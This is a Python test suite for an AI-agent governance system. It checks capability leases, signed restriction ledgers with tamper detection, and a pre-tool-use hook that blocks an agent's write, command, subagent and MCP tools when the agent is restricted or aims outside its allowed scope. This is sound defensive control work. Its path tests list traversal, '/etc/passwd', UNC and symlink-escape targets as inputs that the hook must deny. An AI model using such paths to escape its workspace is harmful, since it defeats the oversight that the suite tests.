from __future__ import annotations

from datetime import datetime, timedelta, timezone
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
KOPANO_CORE = REPO_ROOT / "kopano-core"
if str(KOPANO_CORE) not in sys.path:
    sys.path.insert(0, str(KOPANO_CORE))

from kopano.agent_failure_training import (  # noqa: E402
    FailureClass,
    KCDecision,
    ReplayStatus,
    build_failure_receipt,
    decide_promotion,
    lift_restriction_on_promotion,
    observe_failure_receipt,
    record_authorised_restriction,
    verify_restriction_ledger,
)
from kopano.kpgs_continuous_authorization import (  # noqa: E402
    AuthorizationVerdict,
    BehaviourObservation,
    ContinuousBehaviouralAuthorizer,
    cassey_teacher_review,
    kc_watch_receipt,
)
from kopano.phu_apprenticeship import (  # noqa: E402
    blackmask_drill,
    load_black_mask_doctrine,
)
from kopano.stateless_renter import (  # noqa: E402
    CapabilityLease as RenterLease,
    IdempotencyRecord,
    StatelessRenter,
    TaskContext,
)


def _load_capability_lease_module():
    lease_path = REPO_ROOT / "governance" / "kpgs-vnext" / "security" / "capability_lease.py"
    spec = importlib.util.spec_from_file_location("kpgs_capability_lease_test", lease_path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


LEASE_MOD = _load_capability_lease_module()
HMAC_KEY = b"0123456789abcdef0123456789abcdef"
NOW = datetime(2026, 11, 11, 16, 0, tzinfo=timezone.utc)


def _iso(delta_seconds: int = 0) -> str:
    return (NOW + timedelta(seconds=delta_seconds)).isoformat()


def _sample_failure_receipt(agent_id: str = "cassy"):
    return build_failure_receipt(
        receipt_id="FAIL-2026-11-11-001",
        agent_id=agent_id,
        model_provider="google",
        model_name="gemini-4-argon",
        prompt_context="Attempted mutation of unleased production route",
        system_controls_expected=["PreToolUse lease check", "OneDrive dirty checkout lock"],
        actual_output="Attempted write_to_file outside leased scope",
        violated_governance_rules=["I_AM_STATELESS_RENTER_NOT_LANDLORD", "FOC-R08"],
        failure_classes=[FailureClass.FOC_R08_UNAUTHORIZED_TOOL_ACTION],
        evidence_refs=["receipt://mmao-session-failure-001"],
    )


def _sample_c1_envelope(actor: str = "cassy") -> dict:
    return {
        "intent_id": "intent-rev01",
        "actor_id": actor,
        "executor_seat": "AG-1",
        "surface": "workspace",
        "requested_action": "repo.file.write",
        "target": "kopano-core/kopano/phu_apprenticeship.py",
        "declared_effects": ["file_modified"],
        "allowlist_hit": True,
        "reversibility": "local",
        "external_side_effect": False,
        "classification": "C1_REVERSIBLE",
        "authority_path": "AUTO_LEASE",
        "classifier_version": "v1",
        "submitted_at": _iso(-5),
    }


def _sample_session_lease(actor: str = "cassy") -> dict:
    return {
        "lease_id": "lease-rev01",
        "intent_id": "intent-rev01",
        "actor_id": actor,
        "surface": "workspace",
        "allowed_action": "repo.file.write",
        "allowed_target": "kopano-core/kopano/phu_apprenticeship.py",
        "issued_at": _iso(-10),
        "expires_at": _iso(120),
        "max_invocations": 2,
        "invocations_used": 0,
        "revocable": True,
        "classification": "C1_REVERSIBLE",
    }


def test_unreviewed_failure_receipt_does_not_auto_revoke_or_block(tmp_path: Path):
    """AC-REV01-01: Stage 1 observation alone does NOT revoke leases or block capabilities."""
    obs_ledger = tmp_path / "observed_failures.jsonl"
    rest_ledger = tmp_path / "authorised_restrictions.jsonl"

    receipt = _sample_failure_receipt("cassy")
    obs_row = observe_failure_receipt(receipt, ledger_path=obs_ledger)
    assert obs_row["status"] == "OBSERVED"
    assert not rest_ledger.exists()

    key_ring = LEASE_MOD.KeyRing({"k1": HMAC_KEY}, active_key_id="k1")
    authority = LEASE_MOD.CapabilityLeaseAuthority(
        key_ring,
        restriction_ledger_path=rest_ledger,
        restriction_hmac_key=HMAC_KEY,
    )
    token = authority.issue(
        subject_id="cassy",
        subject_kind="agent",
        tenant_id="kopano",
        domain_id="kpgs",
        task_id="task-01",
        capabilities=[{"name": "repo.file.write", "resource_scope": "wt-w1-acct"}],
        policy_decision_ref="pol:01",
        governing_spec_ref="SPEC-KPGS-REV01",
    )
    decision = authority.authorize(
        token,
        tenant_id="kopano",
        domain_id="kpgs",
        task_id="task-01",
        capability="repo.file.write",
        resource_scope="wt-w1-acct",
        operation_nonce="nonce_stage1_ok",
        correlation_id="corr:01",
    )
    assert decision.subject_id == "cassy"


def test_blackmask_default_ack_false_green_fixed():
    """AC-REV01-02A: Empty list or missing explicit ack in strict mode returns HOLD, never SHIP."""
    empty_res = blackmask_drill(
        "cassy",
        commandments_ack=[],
        pillars_ack=[],
        persist=False,
    )
    assert empty_res["verdict"] == "HOLD"
    assert empty_res["drill_complete"] is False
    assert empty_res["explicit_ack_verified"] is False

    strict_none_res = blackmask_drill(
        "cassy",
        require_explicit_ack=True,
        persist=False,
    )
    assert strict_none_res["verdict"] == "HOLD"
    assert strict_none_res["explicit_ack_verified"] is False

    default_boot_res = blackmask_drill("cassy", persist=False)
    assert default_boot_res["verdict"] == "SHIP"
    assert default_boot_res["explicit_ack_verified"] is False

    doctrine = load_black_mask_doctrine()
    all_cmds = [c["id"] for c in doctrine["commandments"]]
    all_pils = [p["id"] for p in doctrine["pillars"]]
    explicit_res = blackmask_drill(
        "cassy",
        commandments_ack=all_cmds,
        pillars_ack=all_pils,
        persist=False,
        require_explicit_ack=True,
    )
    assert explicit_res["verdict"] == "SHIP"
    assert explicit_res["explicit_ack_verified"] is True


def test_self_validation_and_synthetic_approval_rejected(tmp_path: Path):
    """AC-REV01-02B: Failing agent cannot validate its own failure; synthetic/mismatched receipts rejected."""
    rest_ledger = tmp_path / "authorised_restrictions.jsonl"
    receipt = _sample_failure_receipt("cassy")

    obs = BehaviourObservation(
        session_id="sess-rev01",
        identity_authenticated=True,
        observed_action="repo.file.write",
        observed_target="C:/Users/rkhol/OneDrive/Documents/Anthropic/Introduction to MCP/NOW.md",
        instruction_provenance=("USER_INTENT:intent-rev01",),
        context_provenance=("NOW.md@a4be401d",),
        unrelated_resource_access=True,
        observed_at=_iso(),
    )
    auth_dec = ContinuousBehaviouralAuthorizer().evaluate(
        _sample_c1_envelope("cassy"),
        _sample_session_lease("cassy"),
        obs,
    )
    assert auth_dec.verdict in {AuthorizationVerdict.CONTAIN, AuthorizationVerdict.REVOKE}
    kc_watch = kc_watch_receipt(auth_dec)
    teacher_rev = cassey_teacher_review(auth_dec, approved=False, note="Unauthorized out-of-scope write")

    # 1. Self-validation rejected
    with pytest.raises(PermissionError, match="Self-validation is forbidden"):
        record_authorised_restriction(
            receipt=receipt,
            auth_decision=auth_dec,
            kc_watch=kc_watch,
            teacher_review=teacher_rev,
            validator_id="cassy",
            domain_id="kpgs",
            capabilities=["repo.file.write", "command.execute"],
            ledger_path=rest_ledger,
            hmac_key=HMAC_KEY,
        )

    # 2. Synthetic/mismatched decision_id rejected
    with pytest.raises(PermissionError, match="Synthetic or mismatched"):
        record_authorised_restriction(
            receipt=receipt,
            auth_decision=auth_dec,
            kc_watch={**kc_watch, "decision_id": "forged-id"},
            teacher_review=teacher_rev,
            validator_id="khelos_validator",
            domain_id="kpgs",
            capabilities=["repo.file.write"],
            ledger_path=rest_ledger,
            hmac_key=HMAC_KEY,
        )


def test_authorised_restriction_blocks_lease_and_detects_tampering(tmp_path: Path):
    """AC-REV01-03 & 03B: Validated restriction blocks lease across restart and detects ledger tampering."""
    rest_ledger = tmp_path / "authorised_restrictions.jsonl"
    receipt = _sample_failure_receipt("cassy")

    key_ring = LEASE_MOD.KeyRing({"k1": HMAC_KEY}, active_key_id="k1")
    authority_initial = LEASE_MOD.CapabilityLeaseAuthority(
        key_ring,
        restriction_ledger_path=rest_ledger,
        restriction_hmac_key=HMAC_KEY,
    )
    token = authority_initial.issue(
        subject_id="cassy",
        subject_kind="agent",
        tenant_id="kopano",
        domain_id="kpgs",
        task_id="task-01",
        capabilities=[{"name": "repo.file.write", "resource_scope": "wt-w1-acct"}],
        policy_decision_ref="pol:01",
        governing_spec_ref="SPEC-KPGS-REV01",
    )

    obs = BehaviourObservation(
        session_id="sess-rev01",
        identity_authenticated=True,
        observed_action="repo.file.write",
        observed_target="unleased_target.py",
        instruction_provenance=("USER_INTENT:intent-rev01",),
        context_provenance=("NOW.md@a4be401d",),
        unrelated_resource_access=True,
        observed_at=_iso(),
    )
    auth_dec = ContinuousBehaviouralAuthorizer().evaluate(
        _sample_c1_envelope("cassy"),
        _sample_session_lease("cassy"),
        obs,
    )
    kc_watch = kc_watch_receipt(auth_dec)
    teacher_rev = cassey_teacher_review(auth_dec, approved=False, note="Contain write capability")

    record_authorised_restriction(
        receipt=receipt,
        auth_decision=auth_dec,
        kc_watch=kc_watch,
        teacher_review=teacher_rev,
        validator_id="khelos_validator",
        domain_id="kpgs",
        capabilities=["repo.file.write", "command.execute"],
        ledger_path=rest_ledger,
        hmac_key=HMAC_KEY,
    )

    # Fresh authority instance simulating process restart
    authority_restarted = LEASE_MOD.CapabilityLeaseAuthority(
        key_ring,
        restriction_ledger_path=rest_ledger,
        restriction_hmac_key=HMAC_KEY,
    )
    with pytest.raises(LEASE_MOD.LeaseDenied, match="restricted by validated failure receipt"):
        authority_restarted.authorize(
            token,
            tenant_id="kopano",
            domain_id="kpgs",
            task_id="task-01",
            capability="repo.file.write",
            resource_scope="wt-w1-acct",
            operation_nonce="nonce_after_restriction",
            correlation_id="corr:02",
        )

    with pytest.raises(LEASE_MOD.LeaseDenied, match="restricted by validated failure receipt"):
        authority_restarted.issue(
            subject_id="cassy",
            subject_kind="agent",
            tenant_id="kopano",
            domain_id="kpgs",
            task_id="task-02",
            capabilities=[{"name": "repo.file.write", "resource_scope": "wt-w1-acct"}],
            policy_decision_ref="pol:02",
            governing_spec_ref="SPEC-KPGS-REV01",
        )

    # Tamper with the ledger and prove fail-closed tamper detection
    original_text = rest_ledger.read_text(encoding="utf-8")
    rest_ledger.write_text(original_text.replace('"RESTRICTED"', '"RESTRICTION_LIFTED"'), encoding="utf-8")
    with pytest.raises(ValueError, match="restriction_ledger_tampered"):
        verify_restriction_ledger(rest_ledger, hmac_key=HMAC_KEY)
    with pytest.raises(LEASE_MOD.LeaseDenied, match="restriction_ledger_tampered"):
        authority_restarted.verify(token)


def test_pretooluse_hook_blocks_all_documented_mutation_tools_before_side_effects(tmp_path: Path):
    """AC-REV01-04: PreToolUse hook blocks all documented mutation tools under restriction or out-of-scope target."""
    rest_ledger = tmp_path / "authorised_restrictions.jsonl"
    receipt = _sample_failure_receipt("cassy")

    ed_mod_path = REPO_ROOT / "governance" / "kpgs-vnext" / "security" / "ed25519_stdlib.py"
    ed_spec = importlib.util.spec_from_file_location("kpgs_ed25519_test", ed_mod_path)
    assert ed_spec is not None and ed_spec.loader is not None
    ed_mod = importlib.util.module_from_spec(ed_spec)
    ed_spec.loader.exec_module(ed_mod)
    ed_seed, ed_pub = ed_mod.generate_keypair()

    ring = LEASE_MOD.Ed25519KeyRing({"k1": ed_seed}, active_key_id="k1")
    authority = LEASE_MOD.CapabilityLeaseAuthority(
        ring,
        restriction_ledger_path=rest_ledger,
        restriction_public_keys={"k1": ed_pub},
    )
    token = authority.issue(
        subject_id="cassy",
        subject_kind="agent",
        tenant_id="kopano",
        domain_id="kpgs",
        task_id="task-hook",
        capabilities=[
            {"name": "repo.file.write", "resource_scope": "wt-w1-acct"},
            {"name": "command.execute", "resource_scope": "wt-w1-acct"},
            {"name": "agent.spawn", "resource_scope": "wt-w1-acct"},
            {"name": "mcp.invoke", "resource_scope": "wt-w1-acct"},
            {"name": "browser.interact", "resource_scope": "wt-w1-acct"},
        ],
        policy_decision_ref="pol:hook",
        governing_spec_ref="SPEC-KPGS-REV01",
    )

    obs = BehaviourObservation(
        session_id="sess-hook",
        identity_authenticated=True,
        observed_action="repo.file.write",
        observed_target="unleased.py",
        instruction_provenance=("USER_INTENT:intent-rev01",),
        context_provenance=("NOW.md@a4be401d",),
        unrelated_resource_access=True,
        observed_at=_iso(),
    )
    auth_dec = ContinuousBehaviouralAuthorizer().evaluate(
        _sample_c1_envelope("cassy"),
        _sample_session_lease("cassy"),
        obs,
    )
    record_authorised_restriction(
        receipt=receipt,
        auth_decision=auth_dec,
        kc_watch=kc_watch_receipt(auth_dec),
        teacher_review=cassey_teacher_review(auth_dec, approved=False),
        validator_id="khelos_validator",
        domain_id="kpgs",
        capabilities=["repo.file.write", "command.execute", "agent.spawn", "mcp.invoke", "browser.interact"],
        ledger_path=rest_ledger,
        ed25519_private_key=ed_seed,
        ed25519_key_id="k1",
    )

    ctx_file = tmp_path / "hook_context.json"
    ctx_file.write_text(
        json.dumps(
            {
                "public_keys_hex": ring.export_public_keys_hex(),
                "lease_token": token,
                "restriction_ledger_path": str(rest_ledger),
                "tenant_id": "kopano",
                "domain_id": "kpgs",
                "task_id": "task-hook",
                "resource_scope": "wt-w1-acct",
            }
        ),
        encoding="utf-8",
    )

    gate_script = REPO_ROOT / "scripts" / "kpgs_pretooluse_gate.py"
    env = {**os.environ, "KPGS_HOOK_CONTEXT_FILE": str(ctx_file)}

    mutation_tools = [
        ("run_command", {"CommandLine": "echo test"}),
        ("send_command_input", {"Input": "y"}),
        ("manage_task", {"Action": "kill", "TaskId": "t1"}),
        ("schedule", {"Prompt": "timer", "DurationSeconds": 10}),
        ("write_to_file", {"TargetFile": str(tmp_path / "blocked.txt"), "CodeContent": "x"}),
        ("write_file", {"Path": str(tmp_path / "blocked.txt"), "Content": "x"}),
        ("replace_file_content", {"TargetFile": str(tmp_path / "blocked.txt")}),
        ("multi_replace_file_content", {"TargetFile": str(tmp_path / "blocked.txt")}),
        ("edit_file", {"Path": str(tmp_path / "blocked.txt"), "Target": "a", "Replacement": "b"}),
        ("apply_patch", {"patch": "..."}),
        ("delete_file", {"TargetFile": str(tmp_path / "blocked.txt")}),
        ("invoke_subagent", {"TypeName": "self", "Role": "test", "Prompt": "x"}),
        ("define_subagent", {"Name": "sub", "Description": "d", "SystemPrompt": "s"}),
        ("manage_subagents", {"Action": "kill_all"}),
        ("send_message", {"Recipient": "id", "Message": "m"}),
        ("swarm", {"action": "add", "name": "w", "brief": "b"}),
        ("call_mcp_tool", {"ServerName": "s", "ToolName": "t", "Arguments": {}}),
        ("mcp_github_push_files", {"repo": "test"}),
        ("browser_click", {"element": "btn"}),
        ("unrecognized_future_tool", {"arg": 1}),
    ]

    for idx, (tool_name, args) in enumerate(mutation_tools):
        stdin_payload = json.dumps(
            {
                "conversationId": "conv_test",
                "stepIdx": idx,
                "toolCall": {"name": tool_name, "args": args},
            }
        )
        proc = subprocess.run(
            [sys.executable, str(gate_script), "--event", "pre-tool-use"],
            input=stdin_payload,
            text=True,
            capture_output=True,
            env=env,
            check=False,
        )
        assert proc.returncode == 0, proc.stderr
        out = json.loads(proc.stdout)
        assert out["decision"] == "deny", f"Expected deny for {tool_name}, got {out}"

    assert not (tmp_path / "blocked.txt").exists()

    # Read-only tools must still be allowed
    for ro_tool in ("read_file", "grep_search", "view_file_outline"):
        proc = subprocess.run(
            [sys.executable, str(gate_script), "--event", "pre-tool-use"],
            input=json.dumps({"conversationId": "conv_test", "stepIdx": 99, "toolCall": {"name": ro_tool, "args": {}}}),
            text=True,
            capture_output=True,
            env=env,
            check=False,
        )
        assert json.loads(proc.stdout)["decision"] == "allow"


class _MemoryHubStore:
    def __init__(self) -> None:
        self.checkpoints: dict[tuple[str, str, str], dict] = {}
        self.idempotency: dict[tuple[str, str, str, str], IdempotencyRecord] = {}

    @staticmethod
    def _key(context: TaskContext) -> tuple[str, str, str]:
        return (context.tenant_id, context.domain_id, context.task_id)

    def load_checkpoint(self, context: TaskContext):
        cp = self.checkpoints.get(self._key(context))
        return dict(cp) if cp is not None else None

    def save_checkpoint(self, context: TaskContext, checkpoint):
        self.checkpoints[self._key(context)] = dict(checkpoint)
        return f"hub://cp/{context.task_id}"

    def get_idempotency(self, context: TaskContext, key: str):
        return self.idempotency.get((*self._key(context), key))

    def put_idempotency(self, context: TaskContext, key: str, record: IdempotencyRecord) -> None:
        self.idempotency[(*self._key(context), key)] = record


def test_stateless_renter_blocks_high_consequence_when_cycle_is_none_before_handler():
    """AC-REV01-05: StatelessRenter.execute() denies high/critical/R2/R3 tasks when orchestration_cycle=None and trust_grant=None."""
    store = _MemoryHubStore()
    renter = StatelessRenter("renter-ag1", store)
    context = TaskContext(
        tenant_id="tenant-kopano",
        domain_id="security",
        session_id="session-r2",
        task_id="task-r2",
        correlation_id="corr-01",
        governing_spec_ref="governance/kpgs-vnext/stateless-renter/PROTOCOL.md",
        skill_versions={"kpgs-audit-verify-govern": "0.1.0"},
        orchestration_cycle=None,
        decision_domain="security",
        consequence_class="high",
        authority_mode="execution",
    )
    lease = RenterLease(
        lease_id="lease-r2",
        tenant_id="tenant-kopano",
        domain_id="security",
        task_id="task-r2",
        allowed_operations=frozenset({"repo.file.write"}),
        allowed_resources=frozenset({"kopano-core/kopano/database.py"}),
        expires_at=NOW + timedelta(minutes=5),
    )
    side_effects: list[str] = []

    def _handler(payload):
        side_effects.append("executed")
        return {"ok": True}

    result = renter.execute(
        context=context,
        lease=lease,
        operation="repo.file.write",
        resource="kopano-core/kopano/database.py",
        payload={"change": "test"},
        handler=_handler,
        idempotency_key="idem-01",
        now=NOW,
        trust_grant=None,
    )
    assert result["event_kind"] == "policy.denied"
    assert result["failure"]["code"] == "trust_not_earned"
    assert side_effects == []


def test_recovery_and_promotion_lifts_restriction_only_after_3_seat_and_explicit_blackmask(tmp_path: Path):
    """AC-REV01-06: Restriction is lifted only when decide_promotion passes with 3 distinct seats and explicit BlackMask ack."""
    rest_ledger = tmp_path / "authorised_restrictions.jsonl"
    receipt = _sample_failure_receipt("cassy")

    key_ring = LEASE_MOD.KeyRing({"k1": HMAC_KEY}, active_key_id="k1")
    authority = LEASE_MOD.CapabilityLeaseAuthority(
        key_ring,
        restriction_ledger_path=rest_ledger,
        restriction_hmac_key=HMAC_KEY,
    )
    token = authority.issue(
        subject_id="cassy",
        subject_kind="agent",
        tenant_id="kopano",
        domain_id="kpgs",
        task_id="task-promo",
        capabilities=[{"name": "repo.file.write", "resource_scope": "wt-w1-acct"}],
        policy_decision_ref="pol:promo",
        governing_spec_ref="SPEC-KPGS-REV01",
    )

    obs_fail = BehaviourObservation(
        session_id="sess-promo",
        identity_authenticated=True,
        observed_action="repo.file.write",
        observed_target="unleased.py",
        instruction_provenance=("USER_INTENT:intent-rev01",),
        context_provenance=("NOW.md@a4be401d",),
        unrelated_resource_access=True,
        observed_at=_iso(),
    )
    auth_fail = ContinuousBehaviouralAuthorizer().evaluate(
        _sample_c1_envelope("cassy"),
        _sample_session_lease("cassy"),
        obs_fail,
    )
    record_authorised_restriction(
        receipt=receipt,
        auth_decision=auth_fail,
        kc_watch=kc_watch_receipt(auth_fail),
        teacher_review=cassey_teacher_review(auth_fail, approved=False),
        validator_id="khelos_validator",
        domain_id="kpgs",
        capabilities=["repo.file.write"],
        ledger_path=rest_ledger,
        hmac_key=HMAC_KEY,
    )

    # Attempt lift with default-ack BlackMask (explicit_ack_verified=False) -> MUST FAIL
    promo_ok = decide_promotion(
        receipt=receipt,
        student_agent_id="cassy",
        teacher_agent_id="cassey",
        kc_agent_id="kc",
        teacher_reviewed=True,
        blackmask_passed=True,
        replay_status=ReplayStatus.PASS,
        kc_decision=KCDecision.SAVE,
    )
    assert promo_ok.promoted is True

    obs_allow = BehaviourObservation(
        session_id="sess-promo",
        identity_authenticated=True,
        observed_action="repo.file.write",
        observed_target="kopano-core/kopano/phu_apprenticeship.py",
        instruction_provenance=("USER_INTENT:intent-rev01",),
        context_provenance=("NOW.md@a4be401d",),
        observed_state_changes=("file_modified",),
        observed_at=_iso(10),
    )
    auth_allow = ContinuousBehaviouralAuthorizer().evaluate(
        _sample_c1_envelope("cassy"),
        _sample_session_lease("cassy"),
        obs_allow,
    )
    kc_allow = kc_watch_receipt(auth_allow)
    teacher_allow = cassey_teacher_review(auth_allow, approved=True, note="Verified replay pass")

    default_bm = blackmask_drill("cassy", persist=False)
    with pytest.raises(PermissionError, match="default-ack false-green rejected"):
        lift_restriction_on_promotion(
            receipt=receipt,
            promotion=promo_ok,
            blackmask_result=default_bm,
            teacher_review=teacher_allow,
            kc_watch=kc_allow,
            ledger_path=rest_ledger,
            hmac_key=HMAC_KEY,
        )

    # Explicit 15-commandment + 5-pillar BlackMask drill -> LIFTS RESTRICTION
    doctrine = load_black_mask_doctrine()
    explicit_bm = blackmask_drill(
        "cassy",
        commandments_ack=[c["id"] for c in doctrine["commandments"]],
        pillars_ack=[p["id"] for p in doctrine["pillars"]],
        persist=False,
        require_explicit_ack=True,
    )
    lifted = lift_restriction_on_promotion(
        receipt=receipt,
        promotion=promo_ok,
        blackmask_result=explicit_bm,
        teacher_review=teacher_allow,
        kc_watch=kc_allow,
        ledger_path=rest_ledger,
        hmac_key=HMAC_KEY,
    )
    assert lifted["status"] == "RESTRICTION_LIFTED"

    # Lease is now authorized again
    dec = authority.authorize(
        token,
        tenant_id="kopano",
        domain_id="kpgs",
        task_id="task-promo",
        capability="repo.file.write",
        resource_scope="wt-w1-acct",
        operation_nonce="nonce_after_lift",
        correlation_id="corr:lifted",
    )
    assert dec.subject_id == "cassy"


def _load_gate_module():
    gate = REPO_ROOT / "scripts" / "kpgs_pretooluse_gate.py"
    spec = importlib.util.spec_from_file_location("kpgs_pretooluse_gate_test", gate)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod


def _load_ed25519_module():
    ed_path = REPO_ROOT / "governance" / "kpgs-vnext" / "security" / "ed25519_stdlib.py"
    spec = importlib.util.spec_from_file_location("kpgs_ed25519_boundary_test", ed_path)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod


def _provision_ed25519_hook_context(
    tmp_path: Path,
    *,
    capabilities: list[dict[str, str]] | None = None,
    subject_id: str = "cassy",
    ledger_path: Path | None = None,
    allowed_paths: list[str] | None = None,
) -> tuple[Path, dict[str, str], bytes]:
    ed = _load_ed25519_module()
    seed, pub = ed.generate_keypair()
    ring = LEASE_MOD.Ed25519KeyRing({"k1": seed}, active_key_id="k1")
    authority = LEASE_MOD.CapabilityLeaseAuthority(
        ring,
        restriction_ledger_path=ledger_path,
        restriction_public_keys={"k1": pub} if ledger_path else None,
    )
    caps = capabilities or [
        {"name": "repo.file.write", "resource_scope": "wt-w1-acct"},
        {"name": "command.execute", "resource_scope": "wt-w1-acct"},
    ]
    token = authority.issue(
        subject_id=subject_id,
        subject_kind="agent",
        tenant_id="kopano",
        domain_id="kpgs",
        task_id="task-rev01-gate",
        capabilities=caps,
        policy_decision_ref="pol:rev01",
        governing_spec_ref="SPEC-KPGS-REV01",
    )
    ctx_payload: dict[str, object] = {
        "public_keys_hex": ring.export_public_keys_hex(),
        "lease_token": token,
        "tenant_id": "kopano",
        "domain_id": "kpgs",
        "task_id": "task-rev01-gate",
        "resource_scope": "wt-w1-acct",
    }
    if ledger_path is not None:
        ctx_payload["restriction_ledger_path"] = str(ledger_path)
    if allowed_paths is not None:
        ctx_payload["allowed_paths"] = allowed_paths
    ctx_file = tmp_path / "trusted_hook_context.json"
    ctx_file.write_text(json.dumps(ctx_payload), encoding="utf-8")
    return ctx_file, {**os.environ, "KPGS_HOOK_CONTEXT_FILE": str(ctx_file)}, seed


def _run_gate_subprocess(tool_name: str, args: dict, env: dict[str, str]) -> dict:
    gate = REPO_ROOT / "scripts" / "kpgs_pretooluse_gate.py"
    proc = subprocess.run(
        [sys.executable, str(gate), "--event", "pre-tool-use"],
        input=json.dumps(
            {
                "conversationId": "conv_w1_test",
                "stepIdx": 1,
                "toolCall": {"name": tool_name, "args": args},
            }
        ),
        capture_output=True,
        text=True,
        env=env,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    return json.loads(proc.stdout)


def test_missing_trusted_lease_context_denies_mutations_but_allows_reads(tmp_path: Path):
    """AC-REV01-07: Missing KPGS_HOOK_CONTEXT_FILE must deny mutating tools with exit 0."""
    clean_env = {k: v for k, v in os.environ.items() if k != "KPGS_HOOK_CONTEXT_FILE"}

    for tool_name, args in (
        ("write_to_file", {"TargetFile": str(REPO_ROOT / "allowed.txt")}),
        ("run_command", {"CommandLine": "echo test"}),
        ("replace_file_content", {"TargetFile": str(REPO_ROOT / "allowed.txt")}),
        ("invoke_subagent", {"TypeName": "self", "Role": "r", "Prompt": "p"}),
    ):
        res = _run_gate_subprocess(tool_name, args, clean_env)
        assert res["decision"] == "deny" and res["permissionDecision"] == "deny", res

    ro_res = _run_gate_subprocess("read_file", {"Path": str(REPO_ROOT / "NOW.md")}, clean_env)
    assert ro_res["decision"] == "allow" and ro_res["permissionDecision"] == "allow"

    # Nonexistent path also fails closed
    bad_env = {**clean_env, "KPGS_HOOK_CONTEXT_FILE": str(tmp_path / "does_not_exist.json")}
    missing_res = _run_gate_subprocess("write_to_file", {"TargetFile": str(REPO_ROOT / "allowed.txt")}, bad_env)
    assert missing_res["decision"] == "deny"


def test_cross_platform_path_classification_drive_unc_traversal_and_symlinks(tmp_path: Path, monkeypatch):
    """AC-REV01-08: Explicit Windows/POSIX classification covers drives, UNC, traversal, symlinks & boundaries."""
    from pathlib import PurePosixPath, PureWindowsPath

    gate_mod = _load_gate_module()
    posix_repo = PurePosixPath("/workspace/Introduction-to-MCP")
    win_repo = PureWindowsPath(r"C:\workspace\Introduction-to-MCP")
    nt_repo = REPO_ROOT

    # 1. Explicit POSIX host semantics (drive letters, drive-relative, UNC, traversal, outside, inside)
    for bad_posix in (
        r"C:\Windows\System32\outside.txt",
        "c:/etc/outside.txt",
        "D:relative.txt",
        r"\\server\share\outside.txt",
        "//server/share/outside.txt",
        r"\\?\C:\Windows\System32\outside.txt",
        r"\windows\system32\config",
        "../outside.txt",
        "sub/../../outside.txt",
        r"sub\..\..\outside.txt",
        "/etc/passwd",
        "~/secret.txt",
        "file:///etc/passwd",
        "bad\x00path.txt",
    ):
        dec = gate_mod.classify_target_path(bad_posix, allowed_roots=[posix_repo], repo_root=posix_repo, host_os="posix")
        assert dec.allowed is False, f"POSIX should deny {bad_posix!r}: {dec}"

    for ok_posix in (
        "allowed.txt",
        "scripts/kpgs_pretooluse_gate.py",
        "sub/../allowed.txt",
        "/workspace/Introduction-to-MCP/allowed.txt",
    ):
        dec = gate_mod.classify_target_path(ok_posix, allowed_roots=[posix_repo], repo_root=posix_repo, host_os="posix")
        assert dec.allowed is True, f"POSIX should allow {ok_posix!r}: {dec}"

    # 2. Explicit Windows (nt) host semantics
    for bad_nt in (
        r"C:\Windows\System32\outside.txt",
        "D:drive_relative.txt",
        r"\\server\share\outside.txt",
        "//server/share/outside.txt",
        r"\\?\C:\Windows\System32\outside.txt",
        r"\root_relative_no_drive.txt",
        "../outside.txt",
        r"a\..\..\outside.txt",
        r"C:\Users\rkhol\OneDrive\Documents\Anthropic\Introduction to MCP\NOW.md",
    ):
        dec = gate_mod.classify_target_path(bad_nt, allowed_roots=[nt_repo], repo_root=nt_repo, host_os="nt")
        assert dec.allowed is False, f"Windows should deny {bad_nt!r}: {dec}"
        dec_pure_win = gate_mod.classify_target_path(bad_nt, allowed_roots=[win_repo], repo_root=win_repo, host_os="nt")
        assert dec_pure_win.allowed is False, f"PureWindows should deny {bad_nt!r}: {dec_pure_win}"

    for ok_win in (
        "allowed.txt",
        r"scripts\kpgs_pretooluse_gate.py",
        r"sub\..\allowed.txt",
        r"C:\workspace\Introduction-to-MCP\allowed.txt",
    ):
        dec_ok_win = gate_mod.classify_target_path(ok_win, allowed_roots=[win_repo], repo_root=win_repo, host_os="nt")
        assert dec_ok_win.allowed is True, f"PureWindows should allow {ok_win!r}: {dec_ok_win}"

    # 3. Symlink escape detection (real OS symlink on POSIX/privileged hosts + simulated symlink check on restricted Windows)
    workspace_dir = tmp_path / "ws_root"
    outside_dir = tmp_path / "outside_secret"
    workspace_dir.mkdir()
    outside_dir.mkdir()
    escape_link = workspace_dir / "escape_dir"
    symlink_created = False
    try:
        escape_link.symlink_to(outside_dir, target_is_directory=True)
        symlink_created = True
    except OSError:
        symlink_created = False

    if symlink_created:
        sym_dec = gate_mod.classify_target_path(
            str(escape_link / "pwn.txt"),
            allowed_roots=[workspace_dir],
            repo_root=workspace_dir,
        )
        assert sym_dec.allowed is False and sym_dec.kind in {"symlink_escape", "outside_allowed_roots"}, sym_dec
    else:
        # Windows without SeCreateSymbolicLinkPrivilege: exercise real _detect_symlink_escape logic directly
        monkeypatch.setattr(gate_mod.os.path, "lexists", lambda p: True)
        monkeypatch.setattr(gate_mod.os.path, "islink", lambda p: Path(p).name == "escape_dir")
        monkeypatch.setattr(gate_mod.Path, "resolve", lambda self, strict=False: outside_dir if self.name == "escape_dir" else self)
        sym_err = gate_mod._detect_symlink_escape(workspace_dir / "escape_dir" / "pwn.txt", [workspace_dir])
        assert sym_err is not None and "outside allowed roots" in sym_err

    # 4. End-to-end subprocess check with valid Ed25519 context
    _, env, _ = _provision_ed25519_hook_context(tmp_path)
    for outside_target in (
        str(REPO_ROOT.parent / "outside.txt"),
        r"C:\Windows\System32\outside.txt",
        r"\\server\share\outside.txt",
        "../outside.txt",
        "/etc/outside.txt",
    ):
        outside = _run_gate_subprocess("write_to_file", {"TargetFile": outside_target}, env)
        assert outside["decision"] == "deny" and outside["permissionDecision"] == "deny", outside

    inside = _run_gate_subprocess("write_to_file", {"TargetFile": str(REPO_ROOT / "allowed.txt")}, env)
    assert inside["decision"] == "allow" and inside["permissionDecision"] == "allow", inside


